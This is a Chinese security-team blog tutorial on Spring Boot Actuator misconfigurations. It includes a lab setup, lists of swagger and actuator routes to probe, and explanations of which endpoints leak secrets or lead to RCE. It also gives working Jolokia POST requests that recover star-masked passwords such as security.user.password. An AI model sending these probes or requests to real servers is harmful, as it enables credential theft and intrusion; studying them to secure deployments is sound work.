#  Spring Boot系列漏洞（一）   
 威零安全团队   2024-02-23 18:00  
  
****##   
## 现在只对常读和星标的公众号才展示大图推送，建议大家能把威零安全实验室“设为星标”，否则可能就看不到了啦！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DlIbJNHXhc1VUj9KAjNib3srouDaR6XFyvia8uic5UWcoKRMZsvs2X3UPq2sSia3VswQQe7UU8mSFsBfcOibvfVvusA/640?wx_fmt=png "")  
  
  
  
  
  
  
免责声明  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
  
由于传播、利用本公众号所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担。威零安全实验室公众号及原文章作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2lsubo6ADBMiaTlqOrfVlNpPp1GvHb8VQMqyfbYhb39BTc4XB32iay9icib4txLebALWFdugf8udNrTHRiayiaibLJqYg/640?wx_fmt=png "")  
  
1  
  
环境搭建  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gwibg4AaZyKNc3WyY7tKib0Kn8zRC3hniabfUrK40YwbNlEbC5IuguflQIvctjBC46gLH5lpWa22YvF4XSvdSSTVA/640?wx_fmt=png "")  
  
### 搭建基础  
  
参考：  
  
https://github.com/LandGrey/SpringBootVulExploit  
  
漏洞环境搭建：  
  
https://github.com/LandGrey/SpringBootVulExploit  
  
2  
  
路由知识  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gwibg4AaZyKNc3WyY7tKib0Kn8zRC3hniabfUrK40YwbNlEbC5IuguflQIvctjBC46gLH5lpWa22YvF4XSvdSSTVA/640?wx_fmt=png "")  
  
###   
  
有些程序员会自定义/manage、/managemen  
  
Spring Boot Actuator 1.x 版本默认内置路由的启示路径为/，2.x版本则统一以/actuator为起始路径  
  
Spring Boot Actuator 默认的内置路由名字，如/env有时候也会被程序员修改，比如修改成/appenv  
  
3  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gwibg4AaZyKNc3WyY7tKib0Kn8zRC3hniabfUrK40YwbNlEbC5IuguflQIvctjBC46gLH5lpWa22YvF4XSvdSSTVA/640?wx_fmt=png "")  
  
###   
### 配置文件  
#### application.properties  
  
看配置文件application.properties  
  
//启动端口 9098  
  
server.port=9098  
  
server.address=127.0.0.1  
  
  
  
# vulnerable configuration set 0: spring boot 1.0 - 1.4  
  
# all spring boot versions 1.0 - 1.4 expose actuators by default without any parameters  
  
# no configuration required to expose them  
  
  
# safe configuration set 0: spring boot 1.0 - 1.4  
  
#management.security.enabled=true  
  
  
# vulnerable configuration set 1: spring boot 1.5+  
  
# spring boot 1.5+ requires management.security.enabled=false to expose sensitive actuators  
  
#management.security.enabled=false  
  
  
# safe configuration set 1: spring boot 1.5+  
  
# when 'management.security.enabled=false' but all sensitive actuators explicitly disabled  
  
#management.security.enabled=false  
  
  
## vulnerable configuration set 2: spring boot 2+  
  
#management.security.enabled=false  
  
#management.endpoint.refresh.enabled=true  
  
//开启指定的端点  
  
management.endpoints.web.exposure.include=env,restart,refresh  
  
#management.endpoints.web.exposure.include=*  
  
//开启restart  
  
management.endpoint.restart.enabled=true  
  
  
搭建好运行环境  
  
访问起始路径它会将配置文件中的端点列出  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7DjZohx9gzztnpl1SYbO5VEI87I728xDe3iaGpytw6xPbc6noN0Xz5uFUmcBXUcvlarqMg6tt2YM7gppNfiaPmNA/640?wx_fmt=png "")  
  
  
删除配置文件中的端点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7DjZohx9gzztnpl1SYbO5VEI87I728xD6ZvmfDF9cAcgGAnS6QiacfJRgwxEiajvGgNovJ4vibgWCZqn9CzyYcmUw/640?wx_fmt=png "")  
  
设置配置文件中端点为*  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7DjZohx9gzztnpl1SYbO5VEI87I728xD7qyURggpicZhIbfe1jp2icDJEDFBwxic1JOSCs2ibibLabfzYC9YMRDDzyA/640?wx_fmt=png "")  
  
#### 端点说明（参考说明）  
  
https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints  
```
· env：暴露Spring的属性
· heapdump：返回GZip压缩的hprof堆转储文件。
· restart：重启应用
. refresh：读取加载入口
```  
  
4  
  
信息泄露  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gwibg4AaZyKNc3WyY7tKib0Kn8zRC3hniabfUrK40YwbNlEbC5IuguflQIvctjBC46gLH5lpWa22YvF4XSvdSSTVA/640?wx_fmt=png "")  
  
###   
#### 0x01 路由地址及接口调用详情泄漏  
  
Spring 1.x 和 Spring 2.x 的路由入口不同，区别在于/env 和 /actuator/env  
  
直接访问以下两个 swagger 相关路由，验证漏洞是否存在：  
  
/v2/api-docs  
  
/swagger-ui.html  
  
  
其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：  
  
/swagger  
  
/api-docs  
  
/api.html  
  
/swagger-ui  
  
/swagger/codes  
  
/api/index.html  
  
/api/v2/api-docs  
  
/v2/swagger.json  
  
/swagger-ui/html  
  
/distv2/index.html  
  
/swagger/index.html  
  
/sw/swagger-ui.html  
  
/api/swagger-ui.html  
  
/static/swagger.json  
  
/user/swagger-ui.html  
  
/swagger-ui/index.html  
  
/swagger-dubbo/api-docs  
  
/template/swagger-ui.html  
  
/swagger/static/index.html  
  
/dubbo-provider/distv2/index.html  
  
/spring-security-rest/api/swagger-ui.html  
  
/spring-security-oauth-resource/swagger-ui.html  
  
  
除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：  
  
/mappings  
  
/metrics  
  
/beans  
  
/configprops  
  
/actuator/metrics  
  
/actuator/mappings  
  
/actuator/beans  
  
/actuator/configprops  
  
5  
  
配置不当而暴露的路由  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gwibg4AaZyKNc3WyY7tKib0Kn8zRC3hniabfUrK40YwbNlEbC5IuguflQIvctjBC46gLH5lpWa22YvF4XSvdSSTVA/640?wx_fmt=png "")  
  
  
trace  
  
health  
  
loggers  
  
metrics  
  
autoconfig  
  
heapdump  
  
threaddump  
  
env  
  
info  
  
dump  
  
configprops  
  
mappings  
  
auditevents  
  
beans  
  
jolokia  
  
cloudfoundryapplication  
  
hystrix.stream  
  
actuator  
  
actuator/auditevents  
  
actuator/beans  
  
actuator/health  
  
actuator/conditions  
  
actuator/configprops  
  
actuator/env  
  
actuator/info  
  
actuator/loggers  
  
actuator/heapdump  
  
actuator/threaddump  
  
actuator/metrics  
  
actuator/scheduledtasks  
  
actuator/httptrace  
  
actuator/mappings  
  
actuator/jolokia  
  
actuator/hystrix.stream  
  
  
其中对寻找漏洞比较重要接口的有：  
```
·/env、/actuator/envGET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。
· /refresh、/actuator/refreshPOST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。
· /restart、/actuator/restart暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。
· /jolokia、/actuator/jolokia可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。
· /trace、/actuator/httptrace一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。
·/heapdump、/actuator/heapdump
```  
  
heapdump可以通过工具去分析查询存储在实例类中的信息  
  
6  
  
获取被星号脱敏的密码的明文  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gwibg4AaZyKNc3WyY7tKib0Kn8zRC3hniabfUrK40YwbNlEbC5IuguflQIvctjBC46gLH5lpWa22YvF4XSvdSSTVA/640?wx_fmt=png "")  
  
### 获取被星号脱敏的密码的明文 (方法一)  
  
访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果  
#### 利用条件：  
```
·目标网站存在 /jolokia 或 /actuator/jolokia 接口
·目标使用了 jolokia-core 依赖（版本要求暂未知）
```  
#### 利用方法：  
##### 步骤一： 找到想要获取的属性名  
  
GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。  
##### 步骤二： jolokia 调用相关 Mbean 获取明文  
  
将下面示例中的 security.user.password   
替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value   
键中。  
```
·调用 org.springframework.boot Mbean
```  
```
实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法
```  
  
spring 1.x  
  
POST /jolokia  
  
Content-Type: application/json  
  
  
{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
  
  
spring 2.x  
  
POST /actuator/jolokia  
  
Content-Type: application/json  
  
  
{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
```
·调用 org.springframework.cloud.context.environment Mbean
实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法
```  
  
spring 1.x  
  
POST /jolokia  
  
Content-Type: application/json  
  
  
{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
  
  
spring 2.x  
  
POST /actuator/jolokia  
  
Content-Type: application/json  
  
  
{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
```
·调用其他 Mbean
目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。
```  
  
**未完，请期待后续....**  
  
PY交易  
  
为了方便师傅们交流学习，我特意创建了一个群聊。内部会分享一些脱敏的漏洞报告,渗透测试实战案例，更有若干大牛巨佬分享经验。后续还会提供一些福利包括送书，小礼物等等，欢迎各位师傅进群交流  
  
  
由于  
“威零安全交流群”  
群聊人数已满200人，扫码进不了的师傅可以添加机器人secbot回复  
“威零科技”即可加入群聊  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DlIbJNHXhc0n1RgOINS9LrDGFZiavm2ZTAMicYjRuJLvnrxlK7BcFiczfBBVeox0KT0wv7XNhArmBhvonN9kiaibHZg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DlIbJNHXhc0n1RgOINS9LrDGFZiavm2ZTwKljwdKqZX1bzODZe2UAvAoAA5zgWBV9PwFGa7totR8SlnLHk0Hopw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
